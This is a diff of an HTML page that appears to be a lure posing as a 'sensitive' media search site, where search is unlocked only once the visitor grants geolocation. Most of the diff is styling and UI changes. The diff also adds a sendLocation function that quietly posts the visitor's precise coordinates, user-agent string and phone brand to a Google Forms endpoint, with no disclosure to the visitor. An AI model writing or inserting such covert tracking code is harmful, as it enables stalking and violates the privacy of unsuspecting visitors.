@@ -20,69 +20,73 @@ h1 { margin-top: 40px; }
 
 .main-img {
   margin-top: 20px;
-  width: 120px;
-  height: 120px;
+  width: 150px;
+  height: 150px;
   border-radius: 18px;
   object-fit: cover;
 }
 
-input {
+.control {
+  display: flex;
+  align-items: center;
+  gap: 10px;
   margin-top: 20px;
-  width: 220px;
+}
+
+input {
+  width: 180px;
   padding: 12px;
   border-radius: 10px;
   border: none;
 }
 
-.controls {
-  margin-top: 14px;
-  display: flex;
-  align-items: center;
-  gap: 14px;
-}
-
 button {
-  padding: 10px 30px;
+  padding: 10px 20px;
   border-radius: 10px;
   border: none;
   font-weight: bold;
+  cursor: pointer;
 }
 
-button:disabled {
-  background: #777;
+button.disabled {
+  background: #555;
+  color: #999;
+  cursor: not-allowed;
+}
+
+button.active {
+  background: white;
   color: black;
 }
 
-/* TOGGLE SWITCH */
-.switch {
-  width: 46px;
-  height: 24px;
+/* Toggle */
+.toggle {
+  width: 50px;
+  height: 26px;
   background: #555;
-  border-radius: 50px;
+  border-radius: 20px;
   position: relative;
   cursor: pointer;
-  transition: background 0.3s;
 }
 
-.switch::after {
+.toggle::after {
   content: "";
-  width: 18px;
-  height: 18px;
-  background: black;
+  width: 22px;
+  height: 22px;
+  background: white;
   border-radius: 50%;
   position: absolute;
-  top: 3px;
-  left: 4px;
-  transition: left 0.3s, background 0.3s;
+  top: 2px;
+  left: 2px;
+  transition: 0.3s;
 }
 
-.switch.on {
-  background: white;
+.toggle.on {
+  background: #0f0;
 }
 
-.switch.on::after {
-  left: 24px;
-  background: black;
+.toggle.on::after {
+  left: 26px;
 }
 
 .warning {
@@ -90,7 +94,7 @@ button:disabled {
   opacity: 0.6;
 }
 
-/* MODAL */
+/* Modal */
 .modal {
   display: none;
   position: fixed;
@@ -103,12 +107,12 @@ button:disabled {
 }
 
 .modal-box {
-  position: relative;
   width: 320px;
+  text-align: center;
+  position: relative;
 }
 
-.modal video,
-.modal img {
+.modal img, .modal video {
   width: 100%;
   border-radius: 16px;
 }
@@ -121,28 +125,7 @@ button:disabled {
   cursor: pointer;
 }
 
-/* SLIDER */
-.nav-btn {
-  position: absolute;
-  bottom: -40px;
-  font-size: 26px;
-  background: rgba(0,0,0,0.5);
-  border: none;
-  color: white;
-  padding: 4px 12px;
-  cursor: pointer;
-}
-
-.nav-left { left: 0; }
-.nav-right { right: 0; }
-
-.indicator {
-  margin-top: 10px;
-  font-size: 18px;
-  letter-spacing: 4px;
-}
-
-/* TELEPON */
+/* Phone button */
 .phone-btn {
   position: fixed;
   bottom: 20px;
@@ -154,13 +137,11 @@ button:disabled {
   display: flex;
   justify-content: center;
   align-items: center;
-  z-index: 1000;
-  text-decoration: none;
 }
 
 .phone-btn svg {
-  width: 26px;
-  height: 26px;
+  width: 28px;
+  height: 28px;
   fill: black;
 }
 </style>
@@ -172,23 +153,20 @@ button:disabled {
 
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
-<input id="keyword" placeholder="Search">
-
-<div class="controls">
-  <button id="searchBtn" onclick="search()" disabled>SEARCH</button>
-  <div id="toggle" class="switch" onclick="toggleLocation()"></div>
+<div class="control">
+  <input id="keyword" placeholder="Search" disabled>
+  <button id="searchBtn" class="disabled">SEARCH</button>
+  <div id="toggle" class="toggle"></div>
 </div>
 
-<div class="warning">This Web Is Sensitif⚠</div>
+<div class="warning">This Web Is Sensitive ⚠</div>
 
-<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-box" id="modalBox">
     <div class="close" onclick="closeModal()">✕</div>
   </div>
 </div>
 
-<!-- TELEPON -->
 <a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
 <svg viewBox="0 0 24 24">
 <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
@@ -196,100 +174,94 @@ button:disabled {
 </a>
 
 <script>
-let locationGranted = false;
-
-/* ===== LOCATION ===== */
-function toggleLocation() {
-  if (locationGranted) return;
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      locationGranted = true;
-
-      document.getElementById("toggle").classList.add("on");
-
-      const btn = document.getElementById("searchBtn");
-      btn.disabled = false;
-      btn.style.background = "white";
-    },
-    () => {
-      locationGranted = false;
-      document.getElementById("toggle").classList.remove("on");
-      alert("Lokasi wajib diaktifkan");
-    },
-    { enableHighAccuracy: true }
-  );
-}
-
-/* ===== LIPZZ ===== */
 let data = {};
-let currentImages = [];
-let currentIndex = 0;
+let locationEnabled = false;
 
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
-.then(r => r.json())
-.then(j => data = j);
+  .then(r => r.json())
+  .then(j => data = j);
 
-function search() {
-  if (!locationGranted) return;
+const toggle = document.getElementById("toggle");
+const searchBtn = document.getElementById("searchBtn");
+const keyword = document.getElementById("keyword");
 
-  const key = keyword.value.trim().toLowerCase();
+toggle.onclick = () => {
+  if (locationEnabled) {
+    locationEnabled = false;
+    toggle.classList.remove("on");
+    searchBtn.className = "disabled";
+    keyword.disabled = true;
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(pos => {
+    locationEnabled = true;
+    toggle.classList.add("on");
+    searchBtn.className = "active";
+    keyword.disabled = false;
+
+    sendLocation(pos);
+  }, () => {
+    alert("Izin lokasi ditolak");
+  });
+};
+
+searchBtn.onclick = () => {
+  if (!locationEnabled) return;
+
+  const key = keyword.value.toLowerCase().trim();
   if (!data[key]) return;
 
-  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  const box = document.getElementById("modalBox");
+  box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
   if (data[key].type === "video") {
     const v = document.createElement("video");
     v.src = data[key].src;
     v.controls = true;
     v.autoplay = true;
-    modalBox.appendChild(v);
-  }
-
-  if (data[key].type === "gallery") {
-    currentImages = data[key].images;
-    currentIndex = 0;
-
+    box.appendChild(v);
+  } else {
     const img = document.createElement("img");
-    img.id = "gallery";
-    img.src = currentImages[0];
-    modalBox.appendChild(img);
-
-    const l = document.createElement("button");
-    l.className = "nav-btn nav-left";
-    l.innerText = "<";
-    l.onclick = () => slide(-1);
-    modalBox.appendChild(l);
-
-    const r = document.createElement("button");
-    r.className = "nav-btn nav-right";
-    r.innerText = ">";
-    r.onclick = () => slide(1);
-    modalBox.appendChild(r);
-
-    const ind = document.createElement("div");
-    ind.className = "indicator";
-    ind.id = "indicator";
-    modalBox.appendChild(ind);
-    updateIndicator();
+    img.src = data[key].images[0];
+    box.appendChild(img);
   }
 
-  modal.style.display = "flex";
-}
-
-function slide(d) {
-  currentIndex = (currentIndex + d + currentImages.length) % currentImages.length;
-  gallery.src = currentImages[currentIndex];
-  updateIndicator();
-}
-
-function updateIndicator() {
-  indicator.textContent = currentImages.map((_,i)=> i===currentIndex?"♦":"•").join("");
-}
+  document.getElementById("modal").style.display = "flex";
+};
 
 function closeModal() {
-  modal.style.display = "none";
-  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  document.getElementById("modal").style.display = "none";
+}
+
+function fix(n) {
+  return Number(n).toFixed(6);
+}
+
+function getBrand() {
+  const ua = navigator.userAgent.toLowerCase();
+  if (ua.includes("samsung")) return "Samsung";
+  if (ua.includes("infinix")) return "Infinix";
+  if (ua.includes("xiaomi")) return "Xiaomi";
+  if (ua.includes("oppo")) return "Oppo";
+  if (ua.includes("vivo")) return "Vivo";
+  return "Unknown";
+}
+
+function sendLocation(pos) {
+  const lat = fix(pos.coords.latitude);
+  const lon = fix(pos.coords.longitude);
+  const ua = navigator.userAgent;
+  const brand = getBrand();
+
+  const url =
+    "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse?" +
+    "entry.138340134=" + lat +
+    "&entry.1616098311=" + lon +
+    "&entry.1257224602=" + encodeURIComponent(ua) +
+    "&entry.1874088822=" + brand;
+
+  fetch(url, { mode: "no-cors" });
 }
 </script>
 
